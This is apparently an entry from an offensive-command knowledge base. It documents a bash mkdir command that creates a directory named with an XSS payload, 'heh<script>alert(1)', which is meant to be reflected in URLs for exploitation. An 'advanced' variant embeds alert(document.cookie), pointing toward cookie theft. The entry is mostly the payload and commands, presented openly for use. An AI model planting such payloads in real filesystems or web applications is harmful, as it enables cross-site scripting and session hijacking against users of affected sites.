---
data: mkdir 'heh<script>alert(1)'
tags:
  - setup
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.783Z'
id: 56f1bb90-75cb-4a31-8482-4739d4451281
verified: false
validated: true
submitted: true
---
# mkdir-heh-script-alert-1

## Command

```bash
mkdir 'heh<script>alert(1)'
```

## Description

Creates a directory named 'heh<script>alert(1)' to embed an XSS payload in the filesystem path, which will be reflected in URLs for exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `'heh<script>alert(1)'` | Directory name with quoted XSS payload | Yes |

## Examples

### Basic Usage

```bash
mkdir 'heh<script>alert(1)'
```

### Advanced Usage

```bash
mkdir -p 'path/to/heh<script>alert(document.cookie)</script>'
```

## Expected Output

Directory created successfully (no output if successful; error if name invalid).

## Related

- [[Related Procedure]]
